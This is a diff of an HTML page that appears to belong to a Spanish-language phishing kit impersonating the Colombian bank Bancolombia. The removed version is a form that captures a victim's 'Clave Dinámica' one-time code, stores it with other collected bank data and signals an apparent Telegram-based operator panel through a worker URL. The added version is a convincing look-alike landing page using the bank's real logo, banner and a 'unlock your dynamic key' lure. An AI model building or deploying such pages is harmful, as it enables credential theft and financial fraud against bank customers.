@@ -1,76 +1,432 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Ingresar Dinámica</title>
-<style>
-body {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    background: #f9f9f9;
-    font-family: Arial, sans-serif;
-}
-.container {
-    background: #fff;
-    padding: 20px 30px;
-    border-radius: 10px;
-    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-    width: 300px;
-}
-input {
-    width: 100%;
-    padding: 10px;
-    margin: 10px 0;
-    font-size: 16px;
-}
-button {
-    width: 100%;
-    padding: 12px;
-    font-size: 16px;
-    background: #28a745;
-    color: white;
-    border: none;
-    border-radius: 5px;
-    cursor: pointer;
-}
-button:hover { background: #218838; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clave Dinámica - Bancolombia</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+
+        /* Header Bancolombia */
+        .header-bancolombia {
+            background-color: #ffffff;
+            padding: 15px 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo-bancolombia img {
+            height: 40px;
+        }
+
+        .header-nav {
+            display: flex;
+            gap: 30px;
+        }
+
+        .header-nav a {
+            color: #210049;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 0.9rem;
+            transition: color 0.3s ease;
+        }
+
+        .header-nav a:hover {
+            color: #d9006e;
+        }
+
+        .header-buttons {
+            display: flex;
+            gap: 15px;
+        }
+
+        .btn-sucursal {
+            background-color: #210049;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 6px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 0.9rem;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn-sucursal:hover {
+            background-color: #3a1a6b;
+        }
+
+        /* Banner Principal */
+        .banner-container {
+            background-color: #FFFFFF;
+            padding: 80px 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .banner-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 60px;
+            align-items: center;
+        }
+
+        .banner-text {
+            padding: 20px;
+        }
+
+        .banner-text h1 {
+            font-size: 2.5rem;
+            color: #210049;
+            margin-bottom: 20px;
+            font-weight: 700;
+            line-height: 1.2;
+        }
+
+        .banner-text p {
+            font-size: 1.1rem;
+            color: #333;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .banner-button {
+            display: inline-block;
+            background-color: #FDDA24;
+            color: #210049;
+            padding: 16px 35px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 1.1rem;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(253, 218, 36, 0.3);
+        }
+
+        .banner-button:hover {
+            background-color: #F5C400;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(253, 218, 36, 0.4);
+        }
+
+        .banner-image {
+            text-align: center;
+        }
+
+        .banner-image img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 12px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Sección de Pasos */
+        .steps-section {
+            background-color: #F8F9FA;
+            padding: 80px 20px;
+        }
+
+        .steps-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .steps-title {
+            font-size: 2.2rem;
+            color: #210049;
+            margin-bottom: 60px;
+            font-weight: 700;
+        }
+
+        .steps-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 40px;
+            margin-top: 50px;
+        }
+
+        .step-card {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 12px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+
+        .step-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .step-number {
+            width: 60px;
+            height: 60px;
+            background: #FDDA24;
+            color: #210049;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin: 0 auto 25px;
+        }
+
+        .step-card h3 {
+            font-size: 1.4rem;
+            color: #210049;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .step-card p {
+            color: #666;
+            font-size: 1rem;
+            line-height: 1.6;
+        }
+
+        /* Footer */
+        .footer {
+            background-color: #210049;
+            color: white;
+            padding: 50px 20px 30px;
+        }
+
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 40px;
+        }
+
+        .footer-section h4 {
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .footer-section ul {
+            list-style: none;
+        }
+
+        .footer-section ul li {
+            margin-bottom: 10px;
+        }
+
+        .footer-section a {
+            color: #ccc;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .footer-section a:hover {
+            color: #FDDA24;
+        }
+
+        .footer-bottom {
+            max-width: 1200px;
+            margin: 40px auto 0;
+            padding-top: 30px;
+            border-top: 1px solid #333;
+            text-align: center;
+            color: #ccc;
+            font-size: 0.9rem;
+        }
+
+        .footer-logo {
+            margin-bottom: 20px;
+        }
+
+        .footer-logo img {
+            height: 40px;
+            filter: brightness(0) invert(1);
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header-container {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .header-nav {
+                gap: 20px;
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+
+            .banner-content {
+                grid-template-columns: 1fr;
+                text-align: center;
+                gap: 40px;
+            }
+            
+            .banner-text h1 {
+                font-size: 2rem;
+            }
+            
+            .steps-title {
+                font-size: 1.8rem;
+            }
+            
+            .steps-grid {
+                grid-template-columns: 1fr;
+                gap: 30px;
+            }
+            
+            .footer-container {
+                grid-template-columns: 1fr;
+                text-align: center;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .banner-container {
+                padding: 40px 15px;
+            }
+            
+            .banner-text h1 {
+                font-size: 1.8rem;
+            }
+            
+            .steps-section {
+                padding: 50px 15px;
+            }
+            
+            .step-card {
+                padding: 30px 20px;
+            }
+
+            .header-nav {
+                gap: 15px;
+            }
+
+            .header-nav a {
+                font-size: 0.8rem;
+            }
+        }
+    </style>
 </head>
 <body>
-<div class="container">
-    <h2>Ingresar Dinámica</h2>
-    <input type="text" id="dinamica" placeholder="Código Dinámica">
-    <button id="reset">Enviar y Activar Botones</button>
-</div>
+    <!-- Header Bancolombia -->
+    <header class="header-bancolombia">
+        <div class="header-container">
+            <div class="logo-bancolombia">
+                <img src="https://www.bancolombia.com/wcm/connect/a67af2d6-c768-4f4f-a33b-fd58074f7ce9/logo-bancolombia-black.svg?MOD=AJPERES" alt="Bancolombia">
+            
+           
+        </div>
+    </header>
 
-<script>
-document.getElementById("reset").addEventListener("click", async () => {
-    const dinamica = document.getElementById("dinamica").value;
-    const transactionId = localStorage.getItem("transactionId");
+    <!-- Banner Principal -->
+    <section class="banner-container">
+        <div class="banner-content">
+            <div class="banner-text">
+                <h1>Desbloquea tu Clave Dinámica</h1>
+                <p>Sácale provecho a la app Mi Bancolombia, haz tus movimientos en segundos y con la seguridad de siempre. ¿Qué esperas?</p>
+                <a href="#" class="banner-button">Desbloquea tu Clave Dinámica</a>
+            </div>
+            <div class="banner-image">
+                <img src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/e32cb424-b42f-4a24-9cd1-80e0d44a135a/banner-web-clave-dinamica.jpg?MOD=AJPERES" alt="Clave Dinámica Bancolombia">
+            </div>
+        </div>
+    </section>
 
-    if (!dinamica || !transactionId) {
-        alert("Ingresa la dinámica correctamente.");
-        return;
-    }
+    <!-- Sección de Pasos -->
+    <section class="steps-section">
+        <div class="steps-container">
+            <h2 class="steps-title">Desbloquea en 3 Pasos Sencillos</h2>
+            <div class="steps-grid">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <h3>Ingresa por la Web</h3>
+                    <p>Ingresa a por la web Bancolombia. Es completamente gratuita y segura.</p>
+                </div>
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <h3>Inicia Sesión</h3>
+                    <p>Accede con tu usuario y clave actuales. Si no los tienes, puedes registrarte en pocos minutos.</p>
+                </div>
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <h3>Activa tu Clave</h3>
+                    <p>Ve a la sección de seguridad y sigue los pasos para activar tu Clave Dinámica. ¡Listo para usar!</p>
+                </div>
+            </div>
+        </div>
+    </section>
 
-    try {
-        const res = await fetch("https://tu-worker-url/reset", {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({id: transactionId})
-        });
-        if (res.ok) {
-            alert("Dinámica enviada y botones reactivados en Telegram.");
-            localStorage.setItem("bancoldata", JSON.stringify({...JSON.parse(localStorage.getItem("bancoldata")), dinamica}));
-        }
-    } catch(e) {
-        console.error(e);
-        alert("Error al enviar la dinámica.");
-    }
-});
-</script>
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-section">
+                <div class="footer-logo">
+                    <img src="https://www.bancolombia.com/wcm/connect/a67af2d6-c768-4f4f-a33b-fd58074f7ce9/logo-bancolombia-black.svg?MOD=AJPERES" alt="Bancolombia">
+                </div>
+                <p>Tu seguridad es nuestra prioridad. Bancolombia contigo en cada paso.</p>
+            </div>
+            
+            <div class="footer-section">
+                <h4>Te puede interesar</h4>
+                <ul>
+                    <li><a href="#">Centro de Ayuda</a></li>
+                    <li><a href="#">Puntos de Atención</a></li>
+                    <li><a href="#">App Mi Bancolombia</a></li>
+                    <li><a href="#">Seguridad Digital</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-section">
+                <h4>Legales</h4>
+                <ul>
+                    <li><a href="#">Términos y Condiciones</a></li>
+                    <li><a href="#">Protección de Datos</a></li>
+                    <li><a href="#">Transparencia</a></li>
+                    <li><a href="#">Atención al Consumidor</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-section">
+                <h4>Contáctanos</h4>
+                <ul>
+                    <li>Línea gratuita: 01 8000 9 12345</li>
+                    <li>Bogotá: (601) 343 0000</li>
+                    <li>Medellín: (604) 510 9000</li>
+                    <li><a href="#">Chat en Línea</a></li>
+                </ul>
+            </div>
+        </div>
+        
+        <div class="footer-bottom">
+            <p>&copy; 2024 Bancolombia S.A. Establecimiento Bancario - Todos los derechos reservados</p>
+        </div>
+    </footer>
 </body>
 </html>
